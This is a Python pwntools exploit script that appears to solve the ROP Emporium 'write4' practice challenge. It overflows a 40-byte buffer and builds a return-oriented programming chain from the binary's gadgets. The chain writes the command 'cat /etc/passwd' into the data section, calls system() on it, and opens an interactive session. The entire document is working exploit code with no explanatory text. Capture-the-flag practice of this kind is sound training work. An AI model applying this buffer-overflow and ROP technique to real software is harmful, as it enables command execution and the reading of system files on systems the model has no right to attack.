from pwn import *

e = ELF("./write4")



data_section = 0x601050
system_call = e.symbols["usefulFunction"]+9
mov_r14_r15 = e.symbols["usefulGadgets"]
pop_r14_pop_r15 = 0x0000000000400890 # pop r14; pop r15; ret;
pop_rdi = 0x0000000000400893 # pop rdi; ret;

def writeStringToLocation(inputString, location):
 if len(inputString) % 8 == 0:
     inputString += "\x00" * 8
 else:
     inputString += (8-(len(inputString)%8)) * "\x00"

 payload = ""
 for i in xrange(0,len(inputString),8):
     payload += p64(pop_r14_pop_r15)
     payload += p64(location+i)
     payload += inputString[i:i+8]
     payload += p64(mov_r14_r15)

 return payload

payload = "A" * 40

payload += writeStringToLocation("cat /etc/passwd",data_section)


payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(system_call)


io = e.process()


io.sendline(payload)

io.interactive()
